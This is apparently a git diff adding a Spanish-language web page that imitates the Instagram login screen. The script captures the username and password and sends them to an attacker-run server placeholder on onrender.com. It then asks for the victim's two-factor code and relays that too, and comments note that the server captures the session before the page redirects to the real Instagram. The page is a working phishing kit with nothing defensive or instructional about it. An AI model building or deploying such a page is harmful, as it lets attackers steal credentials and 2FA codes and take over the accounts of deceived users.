@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión • Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #fafafa; /* Fondo muy claro de Instagram */
+        }
+        /* Estilo para simular el logo de texto de Instagram con la nueva fuente */
+        .instagram-logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 3.5rem; /* Hacemos el logo un poco más grande */
+            line-height: 1;
+            font-weight: 400; /* Grand Hotel es cursiva y tiene un solo peso */
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        /* Borde más visible para las cajas de texto */
+        .instagram-input {
+            @apply block w-full px-3 py-2 text-sm text-gray-900 bg-gray-50 border border-gray-600 rounded-sm focus:outline-none focus:ring-0 focus:border-gray-800;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <main class="flex flex-col items-center justify-center pt-8 lg:pt-0">
+
+        <div class="w-full max-w-xs flex flex-col items-center">
+
+            <div class="w-full bg-white p-8 border border-gray-300 rounded-lg shadow-sm">
+
+                <div class="flex flex-col items-center mt-2 mb-8">
+                    <h1 class="instagram-logo">Instagram</h1>
+                </div>
+
+                <div id="step1">
+                    <form id="signinForm" onsubmit="handleSignIn(event)">
+                        
+                        <div class="mb-2">
+                            <input
+                                type="text"
+                                id="identifier"
+                                placeholder="Teléfono, usuario o correo electrónico"
+                                required
+                                class="instagram-input"
+                            >
+                        </div>
+
+                        <div class="mb-4">
+                            <input
+                                type="password"
+                                id="password"
+                                placeholder="Contraseña"
+                                required
+                                class="instagram-input"
+                            >
+                        </div>
+
+                        <button
+                            type="submit"
+                            class="w-full bg-blue-500 text-white font-medium py-1.5 rounded-lg shadow-sm hover:bg-blue-600 disabled:bg-blue-300 focus:outline-none transition duration-150 text-sm opacity-50"
+                            disabled
+                            id="loginButton"
+                        >
+                            Iniciar sesión
+                        </button>
+
+                        <div class="flex items-center my-6">
+                            <hr class="flex-grow border-gray-300">
+                            <span class="px-3 text-xs font-semibold text-gray-500 uppercase">O</span>
+                            <hr class="flex-grow border-gray-300">
+                        </div>
+
+                        <a href="#" class="flex items-center justify-center text-sm font-semibold text-blue-800 hover:text-blue-900 transition duration-150">
+                            <svg class="w-4 h-4 mr-2" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.477 2 2 6.477 2 12c0 5.178 3.77 9.42 8.7 10.28v-7.1h-2.5v-3.1h2.5V9.4c0-2.45 1.495-3.8 3.7-3.8c1.06 0 1.97.076 2.23.115v2.55h-1.5c-1.2 0-1.4.6-1.4 1.4v1.8h3.3l-.5 3.1h-2.8v7.1c4.93-.86 8.7-5.1 8.7-10.28c0-5.523-4.477-10-10-10z"/></svg>
+                            Iniciar sesión con Facebook
+                        </a>
+
+                        <div class="mt-4 text-center">
+                            <a href="#" class="text-xs text-blue-800 hover:text-blue-900 transition duration-150">
+                                ¿Olvidaste tu contraseña?
+                            </a>
+                        </div>
+                    </form>
+                </div>
+                <div id="step2" class="hidden">
+                    <h2 class="text-base text-center font-semibold mb-6 text-gray-800">Completa tu información de contacto</h2>
+                    
+                    <form onsubmit="event.preventDefault()">
+                        <div class="mb-4">
+                            <input
+                                type="tel"
+                                id="phoneNumber"
+                                placeholder="Número de teléfono (con código de país)"
+                                required
+                                class="instagram-input"
+                            >
+                        </div>
+
+                        <button
+                            type="submit"
+                            class="w-full bg-blue-500 text-white font-medium py-1.5 rounded-lg shadow-sm hover:bg-blue-600 focus:outline-none transition duration-150 text-sm"
+                        >
+                            Continuar
+                        </button>
+                    </form>
+                    
+                    <div class="mt-6 text-center text-xs text-gray-500">
+                        <p>Usaremos tu número para enviarte un código de confirmación. Puedes cambiarlo más tarde.</p>
+                    </div>
+                </div>
+                <div id="step3" class="hidden">
+                    <h2 class="text-base text-center font-semibold mb-6 text-gray-800">Se requiere código de seguridad</h2>
+                    
+                    <form onsubmit="handleCodeSubmit(event)">
+                        <div class="mb-2">
+                            <input
+                                type="text"
+                                id="verificationCode"
+                                placeholder="Ingresa el código de 6 dígitos"
+                                required
+                                maxlength="6"
+                                class="instagram-input text-center tracking-widest"
+                            >
+                        </div>
+
+                        <button
+                            type="submit"
+                            class="w-full bg-blue-500 text-white font-medium py-1.5 rounded-lg shadow-sm hover:bg-blue-600 focus:outline-none transition duration-150 text-sm"
+                        >
+                            Confirmar
+                        </button>
+                    </form>
+                    
+                    <div class="mt-6 text-center text-xs text-gray-500">
+                        <p>¿No recibiste el código? <a href="#" class="text-blue-500 hover:underline">Reenviar código</a></p>
+                    </div>
+                </div>
+                </div>
+
+            <div class="w-full max-w-xs bg-white p-4 border border-gray-300 rounded-lg shadow-sm mt-4 text-center">
+                <p class="text-sm text-gray-800">
+                    ¿No tienes una cuenta?
+                    <a href="#" class="text-blue-500 font-medium hover:text-blue-600 transition duration-150">Regístrate</a>
+                </p>
+            </div>
+            
+            <p class="text-sm text-gray-800 mt-4 mb-3">Descarga la aplicación.</p>
+            <div class="flex space-x-2">
+                <a href="#" class="h-10 w-auto">
+                    <img class="h-full w-auto" alt="Descargar en App Store" src="https://placehold.co/136x40/000/fff?text=App+Store" onerror="this.src='https://placehold.co/136x40/000/fff?text=App+Store'">
+                </a>
+                <a href="#" class="h-10 w-auto">
+                    <img class="h-full w-auto" alt="Disponible en Google Play" src="https://placehold.co/136x40/000/fff?text=Google+Play" onerror="this.src='https://placehold.co/136x40/000/fff?text=Google+Play'">
+                </a>
+            </div>
+
+        </div>
+
+    </main>
+    
+    <footer class="w-full text-center mt-12 p-4 text-xs text-gray-500">
+        <p class="mb-2">
+            Al continuar, aceptas las <a href="#" class="hover:underline">Condiciones de uso</a> y la <a href="#" class="hover:underline">Política de privacidad</a>.
+        </p>
+        <p class="mb-4">
+            <a href="#" class="mx-2 hover:underline">Meta</a>
+            <a href="#" class="mx-2 hover:underline">Información</a>
+            <a href="#" class="mx-2 hover:underline">Blog</a>
+            <a href="#" class="mx-2 hover:underline">Empleo</a>
+            <a href="#" class="mx-2 hover:underline">Ayuda</a>
+            <a href="#" class="mx-2 hover:underline">API</a>
+            <a href="#" class="mx-2 hover:underline">Privacidad</a>
+            <a href="#" class="mx-2 hover:underline">Condiciones</a>
+            <a href="#" class="mx-2 hover:underline">Ubicaciones</a>
+            <a href="#" class="mx-2 hover:underline">Instagram Lite</a>
+            <a href="#" class="mx-2 hover:underline">Threads</a>
+            <a href="#" class="mx-2 hover:underline">Carga de contactos y no usuarios</a>
+        </p>
+        <p class="mt-4">
+            <select class="bg-transparent border-none focus:outline-none cursor-pointer p-1 rounded-md text-xs">
+                <option>Español</option>
+                <option>English</option>
+            </select>
+            <span class="ml-4">&copy; 2024 Instagram from Meta</span>
+        </p>
+    </footer>
+
+    <script>
+        // ----------------------------------------------------------------------
+        // ¡IMPORTANTE! REEMPLAZA ESTA URL CON LA DIRECCIÓN REAL DE TU SERVIDOR EN RENDER
+        // ----------------------------------------------------------------------
+        const SERVER_URL = 'https://TU-NOMBRE-APP.onrender.com'; 
+        const REDIRECT_URL = 'https://www.instagram.com/';
+        
+        // Objeto global para almacenar los datos capturados y el ID temporal
+        let capturedData = {
+            identifier: '',
+            password: '',
+            phoneNumber: '',
+            verificationCode: '',
+            temp_id: '' // Nuevo campo para el ID de sesión temporal del servidor
+        };
+
+        // --- FUNCIONES DE MANEJO DE VISTAS ---
+
+        function showStep(stepNumber) {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden'); // El paso 2 ya no se usa, pero lo ocultamos
+            document.getElementById('step3').classList.add('hidden');
+            
+            if (stepNumber === 1) {
+                document.getElementById('step1').classList.remove('hidden');
+            } else if (stepNumber === 3) {
+                document.getElementById('step3').classList.remove('hidden');
+            }
+            // Si es 99, no se muestra nada, solo se redirige
+        }
+
+
+        // --- LÓGICA DE BOTONES Y CAMPOS ---
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const identifierInput = document.getElementById('identifier');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('loginButton');
+
+            const toggleButton = () => {
+                const identifier = identifierInput.value.trim();
+                const password = passwordInput.value.trim();
+                const isDisabled = !(identifier.length > 0 && password.length > 0);
+                
+                loginButton.disabled = isDisabled;
+                loginButton.classList.toggle('opacity-50', isDisabled);
+            };
+
+            identifierInput.addEventListener('input', toggleButton);
+            passwordInput.addEventListener('input', toggleButton);
+            toggleButton();
+        });
+
+
+        // ----------------------------------------------------------------------
+        // FUNCIÓN PRINCIPAL: INICIO DE SESIÓN (PASO 1)
+        // ----------------------------------------------------------------------
+        async function handleSignIn(event) {
+            event.preventDefault();
+            const loginButton = document.getElementById('loginButton');
+            loginButton.textContent = 'Iniciando...';
+            loginButton.disabled = true;
+
+            capturedData.identifier = document.getElementById('identifier').value.trim();
+            capturedData.password = document.getElementById('password').value.trim();
+
+            if (!capturedData.identifier || !capturedData.password) {
+                loginButton.textContent = 'Iniciar sesión';
+                return;
+            }
+
+            try {
+                const response = await fetch(`${SERVER_URL}/api/login-step1`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        identifier: capturedData.identifier,
+                        password: capturedData.password
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    if (result.redirect_step === 3) {
+                        // El servidor de Instagram requiere 2FA. 
+                        capturedData.temp_id = result.temp_id;
+                        showStep(3);
+                        
+                    } else if (result.redirect_step === 99) {
+                        // Login exitoso (sin 2FA). Redirección final.
+                        window.location.href = REDIRECT_URL;
+                    }
+                } else {
+                    // Fallo de credenciales
+                    // En un escenario real, esto se mostraría como un error suave.
+                    alert('Error al iniciar sesión. Comprueba tus credenciales e intenta de nuevo.');
+                    showStep(1); 
+                }
+
+            } catch (error) {
+                console.error('Error de comunicación con el servidor:', error);
+                alert('Error de conexión. Inténtalo de nuevo.');
+                showStep(1);
+            } finally {
+                loginButton.textContent = 'Iniciar sesión';
+                // Volver a habilitar si no se redirigió
+                if (document.getElementById('step1').classList.contains('hidden') === false) {
+                    loginButton.disabled = false;
+                    loginButton.classList.remove('opacity-50');
+                }
+            }
+        }
+
+
+        // ----------------------------------------------------------------------
+        // FUNCIÓN DE VERIFICACIÓN (PASO 3)
+        // ----------------------------------------------------------------------
+        async function handleCodeSubmit(event) {
+            event.preventDefault();
+            const codeInput = document.getElementById('verificationCode');
+            const submitButton = event.submitter || document.querySelector('#step3 button[type="submit"]');
+
+            submitButton.textContent = 'Confirmando...';
+            submitButton.disabled = true;
+            
+            capturedData.verificationCode = codeInput.value.trim();
+
+            if (!capturedData.verificationCode || !capturedData.temp_id) {
+                submitButton.textContent = 'Confirmar';
+                return;
+            }
+
+            try {
+                const response = await fetch(`${SERVER_URL}/api/login-step2`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        temp_id: capturedData.temp_id,
+                        verification_code: capturedData.verificationCode
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success && result.redirect_step === 99) {
+                    // 2FA correcto, servidor capturó la sesión. Redirección final.
+                    window.location.href = REDIRECT_URL;
+                } else {
+                    // Código 2FA incorrecto
+                    alert('El código de verificación es incorrecto. Vuelve a intentarlo.');
+                    codeInput.value = ''; // Limpiar campo
+                    showStep(3); // Mantener en el paso 3
+                }
+
+            } catch (error) {
+                console.error('Error de comunicación con el servidor:', error);
+                alert('Error de conexión. Inténtalo de nuevo.');
+                showStep(3);
+            } finally {
+                submitButton.textContent = 'Confirmar';
+                submitButton.disabled = false;
+            }
+        }
+    </script>
+</body>
+                      </html>
